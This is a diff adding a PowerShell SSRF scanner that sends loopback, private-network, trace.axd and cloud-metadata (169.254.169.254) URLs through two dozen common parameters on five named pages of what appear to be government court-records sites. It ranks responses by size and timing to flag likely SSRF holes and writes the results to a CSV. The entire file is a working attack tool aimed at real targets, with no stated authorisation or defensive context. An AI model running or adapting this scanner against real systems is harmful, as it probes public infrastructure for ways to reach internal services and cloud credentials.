@@ -1,0 +1,86 @@
+# Pages
+$targetPages = @(
+  "https:RETRACTED.gov/AttyCaseListSearch.aspx",
+  "https:RETRACTED.gov/PartySearch.aspx",
+  "https:RETRACTED.gov/PropertyAddressSearch.aspx",
+  "https:RETRACTED.gov.gov/SCByJurisSearch.aspx",
+  "https:RETRACTED.gov/CourtEventsMenu.aspx"
+)
+# Scope
+$paramNames = @(
+  "url","link","src","page","target","file","path","dest","u",
+  "redirect","redirectUrl","next","continue","return","returnUrl","ref",
+  "image","endpoint","feed","callback","template","download","asset","api"
+)
+# Payload
+$payloads = @(
+  "http://127.0.0.1/",
+  "http://127.0.0.1/trace.axd",
+  "http://localhost/trace.axd",
+  "http://127.1/trace.axd",
+  "http://2130706433/trace.axd",
+  "http://[::1]/trace.axd",
+  "http://169.254.169.254/latest/meta-data/",
+  "http://10.0.0.5/",
+  "http://192.168.0.1/"
+)
+
+# ----RUN----
+$results = @()
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+
+foreach ($page in $targetPages) {
+    foreach ($pname in $paramNames) {
+        foreach ($payload in $payloads) {
+            $queryString = "$pname=$([System.Net.WebUtility]::UrlEncode($payload))"
+            $url = "$page`?$queryString" 
+            $sw = [System.Diagnostics.Stopwatch]::StartNew()
+            try {
+                $resp = Invoke-WebRequest -Uri $url -WebSession $session -UseBasicParsing -TimeoutSec 12 -Method GET -ErrorAction Stop
+                $code = $resp.StatusCode
+                $len  = $resp.RawContentLength
+            } catch {
+                $code = if ($_.Exception.Response) { $_.Exception.Response.StatusCode.value__ } else { "ERR" }
+                $len  = 0
+            }
+            $sw.Stop()
+            
+            $results += [pscustomobject]@{
+                Page     = $page
+                Param    = $pname
+                Payload  = $payload
+                Status   = $code
+                Length   = $len
+                TimeMs   = $sw.ElapsedMilliseconds
+                URL      = $url
+            }
+
+            if ($code -ne 404 -and $code -ne "ERR") {
+                Write-Host "[*] $code $pname => $payload  ($($sw.ElapsedMilliseconds) ms, $len B)  on $page"
+            }
+        }
+    }
+}
+
+#----------------------------------------
+# Sort by Length
+Write-Host "`n[*] Sorted by Response Length (largest first):"
+$results | Sort-Object Length -Descending | Select-Object Page, Param, Payload, Status, Length, TimeMs | Format-Table -Auto
+
+# Sort by Time
+Write-Host "`n[*] Sorted by Response Time (slowest first):"
+$results | Sort-Object TimeMs -Descending | Select-Object Page, Param, Payload, Status, Length, TimeMs | Format-Table -Auto
+
+# Highlight 
+$averageLength = ($results | Measure-Object Length -Average).Average
+$interesting = $results | Where-Object { $_.Length -gt ($averageLength * 1.2) -and $_.Status -ne 404 -and $_.Status -ne "ERR" }
+Write-Host "`n[*] Potential SSRF candidates (Length > 1.2x avg):"
+$interesting | Format-Table Page, Param, Payload, Status, Length, TimeMs -Auto
+
+# Save file as excwel doc
+$desktop = [Environment]::GetFolderPath("Desktop")
+$outDir  = Join-Path $desktop "ssrf-param-scan"
+if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
+$csvPath = Join-Path $outDir "ssrf-param-scan.csv"
+$results | Export-Csv -NoTypeInformation -Path $csvPath
+Write-Host "`n[✓] Results saved to: $csvPath"
